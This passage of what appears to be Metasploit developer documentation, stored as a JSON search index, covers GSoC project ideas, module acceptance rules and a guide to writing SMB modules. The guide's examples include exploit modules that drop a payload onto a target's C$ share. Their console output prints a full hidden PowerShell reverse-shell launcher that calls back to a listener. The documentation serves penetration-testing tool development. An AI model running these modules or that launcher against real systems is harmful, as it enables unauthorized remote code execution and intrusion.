    "url": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html"
  },"129": {
    "doc": "2022 Project Ideas",
    "title": "Enhance Metasploit Framework",
    "content": "Retain active status of authentication tokens . Many testing techniques interacting with web servers such as XSS rely on ensuring authentication obtained on a target be kept active. A mechanism for regstering and maintaining open authentications identified during a test for the duration of the console session may provide an additional utility to enable more modules to target techniques that need valid authentication to be maintained. One such authentication token would be data retained in a cookie for a web service. This project would lay the groundwork for registering gathered or generated authenticaion tokens against a target to be refreshed and sustained until a console exits, or in some cases across console restarts. Difficulty: 2/5 . Improving post-exploit API to be more consistent, work smoothly across session types . The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: . | Shell sessions do not implement the filesystem API that Meterpreter sessions have | When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. | Simple commands like ‘cmd_exec’ are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. | . Difficulty: Varies . Improve the web vulnerability API . This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: 4/5 . Data Visualization . Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit ‘Goliath’ Demo (msf-red) . Difficulty 3/5 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html#enhance-metasploit-framework",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html#enhance-metasploit-framework"
  },"130": {
    "doc": "2022 Project Ideas",
    "title": "Submit your own",
    "content": "If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. ",
    "url": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html#submit-your-own",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html#submit-your-own"
  },"131": {
    "doc": "2022 Project Ideas",
    "title": "2022 Project Ideas",
    "content": "GSoC Project Ideas in no particular order. When you’ve picked one, take a look at How-to-Apply-to-GSoC for how to make a proposal. Mentors: @zerosteiner, @jmartin-r7 . ",
    "url": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html",
    "relUrl": "/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html"
  },"132": {
    "doc": "Guidelines for Accepting Modules and Enhancements",
    "title": "Acceptance Guidelines",
    "content": "Contributions from the open source community are the soul of Metasploit, and we love evaluating and landing pull requests that add new Framework features and content. Metasploit Framework has many tens of thousands of users who rely on daily, consistent, and error-free updates. Because of this, Metasploit’s core developers have adopted a fairly high standard for pull requests that add new Framework functionality and Metasploit modules. In order to encourage open and transparent development, this document outlines some general guidelines for Metasploit contributors and developers. Adhering to these guidelines maximizes the chances that your work will be merged into the official Metasploit distribution packages. ",
    "url": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#acceptance-guidelines",
    "relUrl": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#acceptance-guidelines"
  },"133": {
    "doc": "Guidelines for Accepting Modules and Enhancements",
    "title": "Module Additions",
    "content": "Most open source community support for Metasploit comes in the form of Metasploit modules. The following should be considered for acceptance; note that these are guidelines and not categorical imperatives (“should”s, not “must”s), since there are always exceptions to the norm-especially when it comes to novel new attacks and techniques. Modules should pass msftidy.rb and adhere to the CONTRIBUTING.md guidelines. Both are distributed with Metasploit. See Style Tips for some information on how to take some of the headache out of whitespace issues. Modules should have a clear and obvious goal: Exploits should result in a shell. Post modules should result in privilege escalation or loot. Auxiliary modules are an “Everything else” category, but even they should be limited to a well-defined task (e.g., information gathering to enable an exploit or a post module). Modules should not launch other modules, given the complexity of setting multiple payloads. Such actions are usually automation tasks for an external UI. Denial of Service modules should be asymmetric and at least have some interesting feature. If it’s comparable to a synflood, it shouldn’t be included. If it’s comparable to Baliwicked, it should be included. Modules that hover the line, such as slowloris, may be included with some justification. Modules should be able to function as expected with minimal configuration. Defaults should be sensible and usually correct. Modules should not depend on exact timing, uncontrollable heap states, system DLLs, etc. All memory addresses (ie. a JMP ESP, or a ROP gadget) should be part of the metadata under ‘Targets’, and documented (what instructions it points to, and what DLL). If the exploit is against a specific hardware (e.g., routers, PLCs, etc), or against a software that’s not free (and no trial/demo available), please remember to submit a binary packet capture (pcap-formatted) along with the module that demonstrates the exploit actually works. Please don’t use the alphanum encoder as a way to avoid BadChar analysis. Modules which set the EncoderType field in the payload as a way to avoid doing real BadChar analysis will be rejected. These modules are nearly always unreliable in the real world. Exploit ranking definitions can be found on the Exploit Ranking page. Exploit modules should implement a check() function when this is trivial to do so. Versions exposed through banners or network protocols should always result in a check() routine when a patch is available that changes this version. If a module (auxiliary or post) obtains some sort of information from the victim machine, it should store that data using one (or more) of the following methods: . | store_loot(): Used to store both stolen files (both text and binary) and “screencaps” of commands such as a ps -ef and ifconfig. The file itself need not be of forensic-level integrity – they may be parsed by a post module to extract only the relevant information for a penetration tester. | report_auth_info(): Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely “likely” usernames and passwords should use store_loot() instead. | report_vuln(): Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). | report_note(): Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where “loot” or “cred” or “vuln” classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type, such as domain.hosts, so other modules may easily find them in the database. | . Modules should take advantage of the normal Metasploit APIs. For example, they should not attempt to create their own TCP sockets or application protocols with native Ruby; they should mediate sockets through Rex and Rex::Proto methods instead. This ensures compatibility with the full set of Framework features, such as pivoting and proxy chaining. Web application attacks are generally uninteresting (SQLi, XSS, CSRF), unless the module can reliably result in a shell or exercise some kind of useful information leak. Even in that case, the module should “just work,” as above. Web application attacks should be limited only to popular, widely deployed applications. For example, a SQLi module against a popular CMS that results in a shell on the CMS machine would be welcome. A module that causes a private Facebook profile to become public would not (Facebook has exactly one deployed instance). Web application attacks should implement an HttpFingerprint constant. Modules should only list targets that you actually tested the exploit on. Avoid assuming it works on a specific system if it has never been tested on it. Comments above the target entry indicating additional information about a given target (language pack, patch level, etc) greatly assist other developers in creating additional targets and improving your module. Modules can exercise unpatched and undisclosed vulnerabilities. However, Rapid7 is happy to assist with the disclosure process by following the Rapid7 policy. This policy provides a fixed 90-day window from when the vendor is contacted until the exploit is released. All vulnerabilities found by Rapid7 staff follow this process. The submitter will receive full credit for the vulnerability and the resulting exploit module regardless of how disclosure is handled. ",
    "url": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#module-additions",
    "relUrl": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#module-additions"
  },"134": {
    "doc": "Guidelines for Accepting Modules and Enhancements",
    "title": "Framework Enhancements",
    "content": "Generally, new functionality to the Metasploit Framework should start life as a plugin. If the functionality becomes useful and popular, we can integrate it more closely, add RPC API exposure, and so on, but it should be well-tested by the community before then. Automating a series of discrete functions is generally /not/ the responsibility of the Framework. Automation should be accomplished through the API (see Metasploit Community/Pro, MSFGUI, etc). Past efforts with in-Framework automation prove this out. Components such as db_autopwn and browser_autopwn rarely did what users expected, and configuring these tools became a nightmare through increasingly complex sets of options and arguments. Automating the Framework is easy and should stay easy, but the automation itself should live in resource scripts and other external front-ends to the Framework itself. Console functionality should have a focus on exploit and security tool development, with the exploit developer as the typical user. End users should be pointed to an interface such as the Community Edition or MSFGUI and should not expect much in terms of user-friendliness from the console. The console should be considered a debug mode for Metasploit and as close to bare-metal functionality as possible. External tools, such msfpayload and msfvenom, are designed to make exploit development easier and exercise specific techniques. We are happy to continue evaluating tools of this nature for inclusion in the Framework; these should be accompanied by documentation (!), how-to tutorials for quick start, and other helpful text. ",
    "url": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#framework-enhancements",
    "relUrl": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#framework-enhancements"
  },"135": {
    "doc": "Guidelines for Accepting Modules and Enhancements",
    "title": "Guidelines for Accepting Modules and Enhancements",
    "content": " ",
    "url": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html",
    "relUrl": "/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html"
  },"136": {
    "doc": "Guidelines for Writing Modules with SMB",
    "title": "SMB Protocol Overview",
    "content": "SMB (Server Message Block) is a network communication protocol that provides file sharing, network browsing, printing services, and interprocess communication over a network. It relies on lower level protocol transports: . | NetBIOS . | over TCP/IP (NBT) on 137/UDP, 138/UDP, 137/TCP and 139/TCP | over NetBEUI | . | Directly over TCP on 445/TCP (by far the most commonly used) | . CIFS is a particular implementation of SMB created by Microsoft based on the original IBM specifications. It has been replaced by SMB v1.0, which is a Microsoft Extensions to MS-CIFS. SMB2 is a complete rewrite of the protocol which primarily aims to reduce the amount of messages exchanged between the client and the server. SMB v2.0 has been introduced in Windows Vista/Server 2008. It also brings some new features such as: . | Pipelining | Symbolic links | Large file transfers improvement | Better signing | New opportunistic locking mechanism | . SMB v2.1 was added to Windows 7/Server 2008 R2 with a few improvements: . | Minor performance enhancements | New opportunistic locking mechanism | . SMB3 adds some interesting features and has been introduced in Windows 8/Server 2012. Here are some new capabilities added by the SMB v3.0 dialect: . | SMB Direct (SMB over remote direct memory access - RDMA) | SMB Multichannel (multiple connections per SMB session) | SMB Transparent Failover (useful for clustered file server) | Per-share encryption (AES-128 CCM) and AES-based signing | . SMB v3.0.2 (from Windows 8.1/Server 2012 R2) only adds some small improvements. Finally, SMB v3.1.1 (from Windows 10/Server 2016) introduces the following features: . | Negotiation of encryption and integrity algorithms | AES-128 GCM encryption | Pre-authentication integrity check (SHA-512) | Compression | . ",
    "url": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#smb-protocol-overview",
    "relUrl": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#smb-protocol-overview"
  },"137": {
    "doc": "Guidelines for Writing Modules with SMB",
    "title": "Common SMB Packet Exchange Scenarios",
    "content": ". | NetBIOS session establishment This step is only required if NetBIOS over TCP (NBT) transport is used. This is not very common anymore, since SMB over TCP (from windows 2000) removed the NetBIOS transport layer. In case a NetBIOS session needs to be established, this must be the first packet exchange. | Negotiation This is where the SMB protocol version and dialect are going to be negotiated between the client and the server. From SMB v3.1.1, encryption/compression capabilities are also negotiated at the same time. | Authentication Depending on the authentication scheme, this step requires one or two packet exchanges. NTLM challenge-response, the only authentication protocol supported by RubySMB at time of writing, consists of sending first a Session Setup packet containing the client capabilities. The server responds with a challenge. Then, another Session Setup request is sent with the challenge response. If it is accepted, the server returns a Session ID that will be used in subsequent requests. This defines the beginning of an SMB Session. | . Fig.1 - Negotiation &amp; authentication packet exchanges . | Connect to a share Once the SMB session is established, the SMB client must connect to a remote share.This is done by sending a TreeConnect request and getting a Tree ID. This identifier will be used by subsequent file operations on this share. | File operation From there, the client can execute any file operation on the remote share, such as open, read, write, delete, rename, etc. When the client is done with a file, it can simply close the handle. The Tree ID remains valid and can be reused. | . Fig.2 - Connect to share &amp; read file packet exchanges . | Close tree and session The client can decide to release the connection to the share at any time by sending a TreeDisconnect request. Note that the SMB session will remain active until the client sends a Logoff packet, which defines the end of the SMB Session. | . ",
    "url": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#common-smb-packet-exchange-scenarios",
    "relUrl": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#common-smb-packet-exchange-scenarios"
  },"138": {
    "doc": "Guidelines for Writing Modules with SMB",
    "title": "Module Writing",
    "content": "Using the default MSF client . The following mixin will bring everything you need, including the main MSF SMB Client. include Msf::Exploit::Remote::SMB::Client::Authenticated . Following the same workflow described above: . | Initialization | . The first step is to initialize the client by invoking connect. The version(s) that will be negotiated can also be set up by passing an array to the keyword arguments versions. For example, to negotiate any dialect of SMB version 2 and 3, use this: . connect(versions: [2, 3]) . The default is to negotiate versions 1, 2 and 3. Note that the client will just let the SMB server know which versions and dialects it supports. The server will always choose the latest version it supports. This means, Windows 7 will always choose SMB v2.1 (SMB3 has been added to Windows 8 only), even if versions 1, 2 and 3 are advertised by the client. If SMB2 is disabled on this host for whatever reason, the SMB server will fall back to SMB1. By choosing which versions the client must negotiate, you can force the server to use a specific protocol version, assuming it is supported and enabled. From Metasploit 6, the MSF client uses RubySMB under the hood by default for any SMB protocol version. For compatibility with older modules, it is still possible to force the client to use the original Rex SMB implementation. Note that this is not recommended and RubySMB should be the default for new modules. This can be done by explicitly negotiate SMB1 only (Rex only supports this version): . connect(versions: [1]) . | NetBIOS session, negotiation and authentication | . The actual negotiation and authentication are handled by smb_login. This retrieves the NetBIOS name, user name, password and domain from the SMBName, SMBUser, SMBPass and SMBDomain options set by the operator, respectively. Other options can be set and are defined in MSF SMB client. Under the hood, smb_login establishes the NetBIOS session (if needed), negotiates the protocol version/dialect and sets the SMB Session up using NTLM challenge-response authentication protocol. If, for whatever reason, the authentication options cannot be retrieved from the user options, it is still possible to provide them manually by calling simple.login() directly (see SimpleClient#login) . simple.login(name, user, pass) . Note that simple is the Rex::Proto::SMB::SimpleClient object and is accessible anywhere in the module. This is the main interface to interact with RubySMB (more on that later). | Connect to a share | . This is done by invoking simple.connect: . simple.connect(\"\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;\") . | File operations | . | read a file file_path = 'file/path/relative/to/the/share/root' file = smb_open(file_path, 'o') print_status(\"File content: #{file.read}\") file.close . See SimpleClient#open and RubySMB::Dispositions for details about the smb_open mode argument. | write to a file file = smb_open(file_path, 'co', write: true) file &lt;&lt; \"my file data\" file.close . | delete a file simple.delete(file_path) . | . | Close the connection to the remote share | . simple.disconnect(\"\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;\") . Since Metasploit 6, two new options were introduced to control version negotiation and encryption. These options are only available when using the default MSF SMB client and are automatically pulled in with Msf::Exploit::Remote::SMB::Client or Msf::Exploit::Remote::SMB::Client::Authenticated mixins: . | SMB::ProtocolVersion: one or a list of comma-separated SMB protocol versions to negotiate (e.g. “1” or “1,2” or “2,3,1”). | SMB::AlwaysEncrypt: enforces encryption even if the server does not require it (SMB3.x only). When it is set to false, the SMB client will still encrypt the communication if the server requires it. | . Using RubySMB client directly . This mixin is not required but can be useful to expose the SMB related options to the operator: . include Msf::Exploit::Remote::SMB::Client::Authenticated . An alternative is to register the options we need in initialize: . register_options([ OptString.new('SMBUser', [ false, 'The username to authenticate as', '']), OptString.new('SMBPass', [ false, 'The password for the specified username', '']), OptString.new('SMBDomain', [ false, 'The Windows domain to use for authentication', '.']), ]) . Following the same workflow described above: . | Initialization | . | setup the dispatcher dispatcher = RubySMB::Dispatcher::Socket.new(sock) . | initialize the client SMB versions 1, 2 and 3 will be negotiated by default. Use smb1, smb2 and smb3 keyword arguments to disable a version (false value). See RubySMB::Client#initialize for more initialization options client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain']) . | . | Negotiation | . client.negotiate . | Authentication | . client.authenticate . | Connect to a share | . tree = client.tree_connect(\\\\\\\\&lt;host&gt;\\\\&lt;share&gt;) . | File operations | . file_path = 'file/path/relative/to/the/share/root' . | read a file (see RubySMB::SMB1::Tree and RubySMB::SMB2::Tree for details) file = tree.open_file(filename: file_path) data = file.read file.close . | write to a file file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF) file.write(data: 'my data') file.close . | delete a file file = tree.open_file(filename: file_path, delete: true) file.delete file.close . | . | Close the connection to the remote share | . tree.disconnect! . | Close the SMB session | . client.disconnect! . ",
    "url": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#module-writing",
    "relUrl": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#module-writing"
  },"139": {
    "doc": "Guidelines for Writing Modules with SMB",
    "title": "Examples",
    "content": "Using the default MSF client . modules/exploits/windows/smb/msf_smb_client_test.rb . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::SMB::Client::Authenticated def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'MSF SMB Client Test', 'Description' =&gt; %q( This module simply write, read and delete a file on the remote host using default MSF SMB client. ), 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Christophe De La Fuente' ], 'Platform' =&gt; 'windows', 'Arch' =&gt; ARCH_CMD, 'Targets' =&gt; [[ 'Windows', {} ]], 'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp' } ) ) end def exploit connect smb_login share = \"\\\\\\\\#{rhost}\\\\C$\" simple.connect(share) file_path = 'Windows\\\\Temp\\\\payload.bat' print_status(\"Create and write to #{file_path} on #{share} remote share\") file = smb_open(file_path, 'co', write: true) file &lt;&lt; payload.encode file.close print_status(\"Read #{file_path} on #{share} remote share\") file = smb_open(file_path, 'o') print_status(\"File content: #{file.read}\") file.close print_status(\"Delete #{file_path} on #{share} remote share\") simple.delete(file_path) ensure simple.disconnect(share) if simple end end . msfconsole output: . msf6 exploit(windows/smb/msf_smb_client_test) &gt; options Module options (exploit/windows/smb/msf_smb_client_test): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 172.16.60.128 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass ABCDEFG no The password for the specified username SMBUser smbuser no The username to authenticate as Payload options (cmd/windows/powershell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 172.16.60.1 yes The listen address (an interface may be specified) LOAD_MODULES no A list of powershell modules separated by a comma to download over the web LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows msf6 exploit(windows/smb/msf_smb_client_test) &gt; run [*] Started reverse SSL handler on 172.16.60.1:4444 [*] 172.16.60.128:445 - Create and write to Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] 172.16.60.128:445 - Read Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass \"&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAFzTKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" [*] 172.16.60.128:445 - Delete Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] Exploit completed, but no session was created. Using RubySMB client directly . modules/exploits/windows/smb/ruby_smb_client_test.rb . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Exploit::Remote::Tcp def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'RubySMB Client Test', 'Description' =&gt; %q( This module simply write, read and delete a file on the remote host using default RubySMB client. ), 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Christophe De La Fuente' ], 'Platform' =&gt; 'windows', 'Arch' =&gt; ARCH_CMD, 'Targets' =&gt; [[ 'Windows', {} ]], 'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp' } ) ) register_options([ OptString.new('SMBUser', [ false, 'The username to authenticate as', '']), OptString.new('SMBPass', [ false, 'The password for the specified username', '']), OptString.new('SMBDomain', [ false, 'The Windows domain to use for authentication', '.']), ]) end def exploit sock = connect dispatcher = RubySMB::Dispatcher::Socket.new(sock) client = RubySMB::Client.new(dispatcher, username: datastore['SMBUser'], password: datastore['SMBPass'], domain: datastore['SMBDomain'], always_encrypt: false) client.negotiate client.authenticate share = \"\\\\\\\\#{rhost}\\\\C$\" tree = client.tree_connect(share) file_path = 'Windows\\\\Temp\\\\payload.bat' print_status(\"Create and write to #{file_path} on #{share} remote share\") file = tree.open_file(filename: file_path, write: true, disposition: RubySMB::Dispositions::FILE_OPEN_IF) file.write(data: payload.encode) file.close print_status(\"Read #{file_path} on #{share} remote share\") file = tree.open_file(filename: file_path) print_status(\"File content: #{file.read}\") file.close print_status(\"Delete #{file_path} on #{share} remote share\") file = tree.open_file(filename: file_path, delete: true) file.delete file.close ensure tree.disconnect! if tree client.disconnect! if client end end . msfconsole output: . msf6 exploit(windows/smb/ruby_smb_client_test) &gt; options Module options (exploit/windows/smb/ruby_smb_client_test): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 172.16.60.128 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 445 yes The target port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass ABCDEFG no The password for the specified username SMBUser smbuser no The username to authenticate as Payload options (cmd/windows/powershell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 172.16.60.1 yes The listen address (an interface may be specified) LOAD_MODULES no A list of powershell modules separated by a comma to download over the web LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows msf6 exploit(windows/smb/ruby_smb_client_test) &gt; run [*] Started reverse SSL handler on 172.16.60.1:4444 [*] 172.16.60.128:445 - Create and write to Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] 172.16.60.128:445 - Read Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] 172.16.60.128:445 - File content: powershell.exe -nop -w hidden -noni -ep bypass \"&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAA3UKl8CA51WXW/bNhR996+48LRaQizCNroOCJBirpJuAbLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzASG5TznEMItzLVGjnMdvDJ/IxzyVHCO7ika4Q/qEx2rZaxZDoVHH5HHd7ijGUpcg2txxaYx9swuIAvuAm/zv5BpiEc71b4hS7RLGpi7KPCvjImfym8xDnNMx1JTMxOSjNlIDwtczxYjaTY7sgzC7PeWKlsW/ua4qoKrfUIxf6ISrr0y/+TWMuU30+9SCyXlCfd49VYZUzwZ4uXYsMzQZNiNXCYUjBUCpwAS5HkGVqCv/kBlCbpHPzKDYT4L7RnKU/aQbFZnivOZqky8hvJL4zLnfm/JFa1WLAH1IqM2erGWUzfm+f0IFGaSm39Os/FrkvRRcNuyBiutAEs0+GXVPav0ZW4RqnwlPEBupHyl5hHI+eo3f91QPofyIce6be7NgrnulXKp7REurRcS2hiyiwu1gzHml2ZnZKcrZS2S0aDmlJZXIG9wg5Zbip+R+LK1Hf+u97clBR2/UdvbND3EFIFk6Mz33ApNEYodTpPGdX4N83ShNq6i2iWzSh7mAbBC3TIMNcLW7T20FC9pEvQSF4tSB1QU7HJbKdxMp169teWXY+QQc88Tz8/9vZOVORJte1PNG41Qc5EYmv6/HwYR9fXgRX6k7Xx27emOMVGlZMhXmCWgcw5N9ZgZMiVKdA2nIGHfH1u37ht7zOzZjJy2GBiucp1vXnHI7HayfR+ocGPAhj0+r/AnymTQom5hkjIlZCFfASG1qO1VCDROFhjQu74HXf15zQhdlyhX0fX7XXrF3KD/F4vmkVTdW+zbE6q5m1STc6mcGMgrTau88mB59u5Vqc+C3lF2cJwLkEh5YfJUlvVtO3jHw3kgFTRlrOrQgqervlaPGB4tV0ZbZXR+4CyP+7ENynRGcXQMXkuWNwIVmQyICOqF2a187Hzv1O3WaQZ+r6XFj1QHv+GNPHLiu9Crwve0bkAQo7QO8ntlaWPydiE8tol5aaDNSFFiFcu5BrF9Di1VBpobkgVMlfhgJcGz8rKjASr5UkCIKyGbQk++PiuD0/wNddhiQpOiiOoARSCVMBG5B+kADo1yNYS8VBKISe96ZGzButin7AMqfSDlxhcNF9M429bp530n8qnhvlh6zRL5aRxqjOfs1wtDvevG4PuRokyodDFU9+IsRar6ho03xCtw7fDITnuEoTQXT52gHwHT7D+aT8JAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" [*] 172.16.60.128:445 - Delete Windows\\Temp\\payload.bat on \\\\172.16.60.128\\C$ remote share [*] Exploit completed, but no session was created. ",
    "url": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#examples",
    "relUrl": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html#examples"
  },"140": {
    "doc": "Guidelines for Writing Modules with SMB",
    "title": "Guidelines for Writing Modules with SMB",
    "content": "This is a simple guideline to write SMB-based modules, focusing on the new RubySMB implementation that includes SMB3 support. ",
    "url": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html",
    "relUrl": "/docs/development/developing-modules/libraries/smb/guidelines-for-writing-modules-with-smb.html"
  },"141": {
    "doc": "Fail_with",
    "title": "On this page",
    "content": ". | Example uses | Comprehensive list of fail_with parameters | . When a module fails, the fail_with method provides a standardized way to describe the reason for the failure. The first parameter depends on the cause of the failure. ",
    "url": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#on-this-page",
    "relUrl": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#on-this-page"
  },"142": {
    "doc": "Fail_with",
    "title": "Example uses",
    "content": "modules/exploits/osx/local/sudo_password_bypass.rb fails using Failure::NotVulnerable if the check method does not indicate that the target is vulnerable: . if check != CheckCode::Vulnerable fail_with Failure::NotVulnerable, 'Target is not vulnerable' end . modules/exploits/multi/http/struts2_namespace_ognl.rb fails using the Failure::PayloadFailed if the target’s response does not include a string indicating that the payload successfully executed. Alternatively, if the target responds with an HTTP error, the module invokes fail_with using the Failure::UnexpectedReply parameter: . if r &amp;&amp; r.headers &amp;&amp; r.headers['Location'].split('/')[1] == success_string print_good(\"Payload successfully dropped and executed.\") elsif r &amp;&amp; r.headers['Location'] vprint_error(\"RESPONSE: \" + r.headers['Location']) fail_with(Failure::PayloadFailed, \"Target did not successfully execute the request\") elsif r &amp;&amp; r.code == 400 fail_with(Failure::UnexpectedReply, \"Target reported an unspecified error while executing the payload\") end . ",
    "url": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#example-uses",
    "relUrl": "/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html#example-uses"
  },"143": {
    "doc": "Fail_with",
    "title": "Comprehensive list of fail_with parameters",
